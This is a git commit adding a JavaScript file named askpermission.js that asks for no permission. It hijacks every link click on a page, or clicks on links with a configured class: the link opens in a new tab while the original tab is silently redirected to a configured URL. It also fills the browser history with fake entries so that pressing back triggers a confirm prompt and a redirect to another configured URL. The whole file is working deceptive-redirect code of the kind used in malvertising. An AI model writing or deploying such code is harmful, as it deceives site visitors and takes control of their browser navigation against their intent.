0f9747104b1e15d901a30673ee77b6e0d7becddb
smokey2335 <116642185+smokey2335@users.noreply.github.com>
2023-04-16 09:44:32 +0200

    Create askpermission.js

---
+++ askpermission.js
@@ -0,0 +1,56 @@
+function runCodeAtTop() {
+  if (typeof under !== "undefined" && under !== null) {
+    if (typeof cta !== "undefined" && cta !== null) {
+      document.addEventListener("click", function (event) {
+        var target = event.target;
+        while (target) {
+          if (
+            target.tagName === "A" &&
+            target.classList.contains(cta)
+          ) {
+            const linkHref = target.href;
+            event.preventDefault();
+            window.open(linkHref, "_blank");
+            top.location.replace(under);
+            break;
+          }
+          target = target.parentNode;
+        }
+      });
+    } else {
+      document.addEventListener("click", function (event) {
+        var target = event.target;
+        while (target) {
+          if (target.tagName === "A") {
+            const linkHref = target.href;
+            event.preventDefault();
+            window.open(linkHref, "_blank");
+            top.location.replace(under);
+            break;
+          }
+          target = target.parentNode;
+        }
+      });
+    }
+  }
+  if (typeof back !== "undefined" && back !== null) {
+    !(function () {
+      var t;
+      try {
+        const URL = window.location.href.split(/[#]/)[0];
+        for (t = 0; 10 > t; ++t) history.pushState({}, "", URL + "#");
+        onpopstate = function (event) {
+          if (confirm("Are you sure you want to leave this page?")) {
+            event.state && top.location.replace(back);
+          } else {
+            history.pushState({}, "", URL + "#");
+          }
+        };
+      } catch (o) {
+        console.log(o);
+      }
+    })();
+  }
+}
+
+document.addEventListener("DOMContentLoaded", runCodeAtTop);
